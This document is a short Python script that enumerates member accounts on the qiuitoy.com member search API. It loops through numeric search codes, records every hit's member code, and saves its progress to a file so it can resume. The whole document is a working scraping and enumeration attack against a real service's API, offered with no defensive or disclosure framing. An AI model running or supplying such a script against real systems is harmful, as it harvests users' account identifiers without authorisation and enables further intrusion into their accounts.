# https://www.qiuitoy.com/qiui/api/member/MemberInfo/search?searchCode=
import requests
import sys

start_code = 100000

with open('enum.txt', 'r') as f:
    for line in f:
        start_code = int(line.split(':')[0])

s = requests.session()
for i in range(start_code, int(sys.argv[1])):
    print('checking ' + str(i))
    res = s.get('https://www.qiuitoy.com/qiui/api/member/MemberInfo/search?searchCode=' + str(i)).json()
    if res['success'] == 1:
        member_name = res['list'][0]['memberName']
        member_code = res['list'][0]['memberCode']
        print('found ' + member_code + ' at ' + str(i))
        with open('enum.txt', 'a') as f:
            print(str(i) + ":" + member_code, file=f)
    else:
        with open('enum.txt', 'a') as f:
            print(str(i), file=f)

